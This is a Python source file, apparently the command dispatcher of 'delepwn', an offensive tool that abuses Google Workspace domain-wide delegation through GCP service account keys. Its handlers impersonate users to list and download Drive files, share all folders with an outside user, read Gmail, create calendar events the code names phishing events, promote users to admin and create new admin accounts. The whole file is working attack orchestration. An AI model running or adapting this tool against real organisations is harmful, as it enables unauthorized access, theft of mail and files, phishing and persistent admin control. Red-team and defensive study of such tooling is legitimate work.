import os
import sys
import csv
from datetime import datetime, timedelta
from delepwn.core.enumerator import ServiceAccountEnumerator
from delepwn.core.delegator import check, test_service_account_key
from delepwn.utils.output import print_color
from delepwn.services.drive import DriveManager
from delepwn.services.calendar import CalendarManager
from delepwn.services.admin import AdminManager
from delepwn.auth.credentials import CustomCredentials
from google.oauth2 import service_account
from delepwn.services.gmail import GmailManager


class CommandHandler:
    """Handles command execution for different modules"""
    
    @staticmethod
    def handle_enum_command(args):
        """Handle enumeration commands"""
        # Check for list-projects first
        if args.list_projects:
            try:
                if args.key_file:
                    # Use service account key file if provided
                    try:
                        credentials = service_account.Credentials.from_service_account_file(args.key_file)
                        print_color(f"✓ Successfully loaded service account: {credentials.service_account_email}", color="green")
                    except Exception as e:
                        print_color(f"× Error loading service account key file: {str(e)}", color="red")
                        sys.exit(1)
                else:
                    # Use token authentication
                    token = os.environ.get('GCP_BEARER_ACCESS_TOKEN')
                    if not token:
                        print_color("GCP_BEARER_ACCESS_TOKEN environment variable is not set. This tool requires an access token for "
                                "a user with the iam.ServiceAccountKeys.create permission.\n\nRun 'gcloud auth print-access-token' to get a valid token.", color="red")
                        sys.exit(1)
                    credentials = CustomCredentials(token)

                enumerator = ServiceAccountEnumerator(credentials, verbose=args.verbose, project_id=args.project, current_email=args.current_email)
                
                print_color("\n→ Listing accessible GCP projects:\n", color="cyan")
                projects = enumerator.list_projects()
                for project in projects:
                    print_color(f"Project ID: {project['projectId']}", color="white")
                    print_color(f"Project Name: {project['name']}", color="cyan")
                    print(f"Project Number: {project['projectNumber']}")
                    roles = project.get('roles', [])
                    print_color(f"  Your Roles: {', '.join(roles)}", color="yellow")
                    print_color(f"  Key Creation Perms: {'✓' if any(enumerator.check_permission(r) for r in roles) else '✗'}", 
                                color="green" if any(enumerator.check_permission(r) for r in roles) else "red")
                    print("---")
                sys.exit(0)
            except Exception as e:
                print_color(f"An error occurred while listing projects: {str(e)}", color="red")
                raise
            return

        # If key file is provided, test it directly for DWD privileges
        if args.key_file:
            try:
                print_color(f"\n→ Testing service account key file: {args.key_file}", color="cyan")
                
                # Load the service account key
                try:
                    credentials = service_account.Credentials.from_service_account_file(args.key_file)
                    service_account_email = credentials.service_account_email
                    print_color(f"✓ Successfully loaded service account: {service_account_email}", color="green")
                except Exception as e:
                    print_color(f"× Error loading service account key file: {str(e)}", color="red")
                    sys.exit(1)
                    
                # Test the service account for DWD
                test_service_account_key(credentials, args, args.verbose)
                return
                
            except Exception as e:
                print_color(f"An error occurred while testing service account: {str(e)}", color="red")
                sys.exit(1)
        
        # Original enumeration logic for when no key file is provided
        token = os.environ.get('GCP_BEARER_ACCESS_TOKEN')
        if not token:
            print_color("GCP_BEARER_ACCESS_TOKEN environment variable is not set. This tool requires an access token for "
                       "a user with the iam.ServiceAccountKeys.create permission.\n\nRun 'gcloud auth print-access-token' to get a valid token.", color="red")
            sys.exit(1)

        try:
            credentials = CustomCredentials(token)
            enumerator = ServiceAccountEnumerator(credentials, verbose=args.verbose, project_id=args.project, current_email=args.current_email)
            #enumerator.check_access = args.check_access
            
            if args.list_projects:
                print_color("\n→ Listing accessible GCP projects:\n", color="cyan")
                projects = enumerator.list_projects()
                for project in projects:
                    print_color(f"Project ID: {project['projectId']}", color="white")
                    print_color(f"Project Name: {project['name']}", color="cyan")
                    print(f"Project Number: {project['projectNumber']}")
                    roles = project.get('roles', [])
                    print_color(f"  Your Roles: {', '.join(roles)}", color="yellow")
                    print_color(f"  Key Creation Perms: {'✓' if any(enumerator.check_permission(r) for r in roles) else '✗'}", 
                                color="green" if any(enumerator.check_permission(r) for r in roles) else "red")
                    print("---")
                sys.exit(0)
            
            if enumerator.user_email is None:
                raise Exception(print_color("[-] Error verifying token. Ensure it's refreshed.", color="red"))
            
            print_color(f"\n✓ GCP_BEARER_ACCESS_TOKEN is set with access token of {enumerator.user_email}", color="cyan")
            check(enumerator, args.email, args.verbose, args.output)
        except Exception as e:
            print_color(f"An error occurred: {e}", color="red")
            raise

    @staticmethod
    def handle_drive_command(args):
        """Handle drive-related commands"""
        try:
            drive_manager = DriveManager(service_account_file=args.key_file)
            access_token = drive_manager.get_access_token(args.impersonate)
            drive_manager.initialize_service(access_token)
            
            if args.download:
                drive_manager.download_file(args.download)
            elif args.list:
                CommandHandler._handle_drive_list(drive_manager, args)
            elif args.sharefolders:
                CommandHandler._handle_drive_share(drive_manager, args)
                    
        except Exception as e:
            print_color(f"An error occurred: {str(e)}", color="red")
            raise

    @staticmethod
    def _handle_drive_list(drive_manager, args):
        """Handle drive list subcommand"""
        if args.output:
            with open(args.output, mode='w', newline='') as csv_file:
                writer = csv.writer(csv_file)
                writer.writerow(['File', 'ID', 'Size', 'Trashed', 'Extension'])
        drive_manager.list_files(args.output, args.folder)

    @staticmethod
    def _handle_drive_share(drive_manager, args):
        """Handle the drive share command"""
        try:
            print_color("\nStarting folder sharing process...", color="cyan")
            if args.sharefolders:
                drive_manager.share_all_folders(
                    target_users=[args.sharefolders],  # Pass as list
                    include_subfolders=True  # Default to always include subfolders
                )
        except Exception as e:
            print_color(f"An error occurred: {str(e)}", color="red")
            raise

    @staticmethod
    def handle_calendar_command(args):
        """Handle calendar-related commands"""
        try:
            if args.list and not (args.start_date and args.end_date):
                raise ValueError("--list requires both --start-date and --end-date")
                
            calendar_manager = CalendarManager(service_account_file=args.key_file)
            calendar_manager.initialize_service(args.impersonate)

            if args.list:
                CommandHandler._handle_calendar_list(calendar_manager, args)
            elif args.details:
                calendar_manager.get_event_details(args.details)
            elif args.create:
                calendar_manager.create_phishing_event(args.create)
            elif args.delete:
                calendar_manager.delete_event(args.delete)
                
        except Exception as e:
            print_color(f"An error occurred: {str(e)}", color="red")
            raise

    @staticmethod
    def _handle_calendar_list(calendar_manager, args):
        """Handle calendar list subcommand"""
        try:
            start_date = datetime.strptime(args.start_date, '%Y-%m-%d') if args.start_date else datetime.now()
            end_date = datetime.strptime(args.end_date, '%Y-%m-%d') if args.end_date else start_date + timedelta(days=7)
        except ValueError:
            print_color("Invalid date format. Please use YYYY-MM-DD", color="red")
            sys.exit(1)
            
        calendar_manager.list_events(start_date, end_date)

    @staticmethod
    def handle_admin_command(args):
        """Handle admin commands for user privilege elevation"""
        try:
            from src.managers.admin_manager import AdminManager
            
            admin_manager = AdminManager(service_account_file=args.key_file)
            admin_manager.initialize_service(args.impersonate)
            
            if args.elevate:
                admin_manager.make_user_admin(args.elevate)
            elif args.create:
                # Validate email format
                if '@' not in args.create:
                    print_color("× Error: --create requires a full email address", color="red")
                    return
                    
                success, password = admin_manager.create_admin_user(args.create)
                if success:
                    print_color(f"\nAdmin Account Created Successfully:", color="green")
                    print_color(f"Email: {args.create}", color="white")
                    print_color(f"Password: {password}", color="white")
                
        except Exception as e:
            print_color(f"An error occurred: {str(e)}", color="red")
            raise

    @staticmethod
    def handle_gmail_command(args):
        """Handle Gmail-related commands"""
        try:
            gmail_manager = GmailManager(service_account_file=args.key_file)
            gmail_manager.initialize_service(args.impersonate)

            if args.list:
                gmail_manager.list_messages(
                    max_results=args.max_results,
                    start_date=args.start_date,
                    end_date=args.end_date,
                    keyword=args.keyword
                )
            else:
                print_color("No Gmail operation specified. Use --list to list emails.", color="yellow")
                
        except Exception as e:
            print_color(f"An error occurred: {str(e)}", color="red")
            raise